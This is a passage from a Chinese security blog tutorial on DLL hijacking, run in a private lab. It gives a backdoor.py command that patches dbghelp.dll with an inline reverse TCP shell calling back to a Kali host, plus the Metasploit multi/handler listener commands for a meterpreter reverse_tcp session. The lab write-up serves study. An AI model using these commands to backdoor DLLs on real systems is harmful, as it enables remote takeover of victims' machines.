+<p>文章地址2：<a href="https://mp.weixin.qq.com/s/6h2eYnbVnjmeGACUjgx1nw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/6h2eYnbVnjmeGACUjgx1nw</a></p>
+<p>我还是贴一下命令吧，省的复制粘贴了。</p>
+<p>本机：win10，192.168.3.111</p>
+<p>kali：192.168.3.137</p>
+<p>winxp：192.168.3.134</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 backdoor.py -f shiyan/dbghelp.dll -s reverse_shell_tcp_inline -P <span class="number">8888</span> -H <span class="number">192.168</span><span class="number">.3</span><span class="number">.137</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 &gt; set lport <span class="number">8888</span></span><br><span class="line">msf5 &gt; set lhost <span class="number">192.168</span>.<span class="number">3.137</span></span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure>
+<p>再来张失败的截图：</p>
+<p><img src="http:\\sh1yan.top\photo\The-Principle-and-Practice-of-DLL-Hijacking\6.png" alt></p>
+<p><strong>0x10 参考文章</strong></p>
+<p>[1]<a href="https://payloads.online/archivers/2018-12-22/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-12-22/1</a><br>[2]<a href="https://baike.baidu.com/item/DLL%E6%96%87%E4%BB%B6/4170556" target="_blank" rel="noopener">https://baike.baidu.com/item/DLL%E6%96%87%E4%BB%B6/4170556</a><br>[3]<a href="https://www.cnblogs.com/swyft/articles/5580342.html" target="_blank" rel="noopener">https://www.cnblogs.com/swyft/articles/5580342.html</a><br>[4]<a href="https://blog.csdn.net/Call_Coder/article/details/79331686" target="_blank" rel="noopener">https://blog.csdn.net/Call_Coder/article/details/79331686</a><br>[5]<a href="http://www.mamicode.com/info-detail-1986623.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1986623.html</a><br>[6]<a href="https://blog.csdn.net/qq_15727809/article/details/83409980" target="_blank" rel="noopener">https://blog.csdn.net/qq_15727809/article/details/83409980</a></p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2019/06/16/The-Principle-and-Practice-of-DLL-Hijacking/" data-id="cl64hepfj0034asw1b1kqsgzf" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DLL劫持/">DLL劫持</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
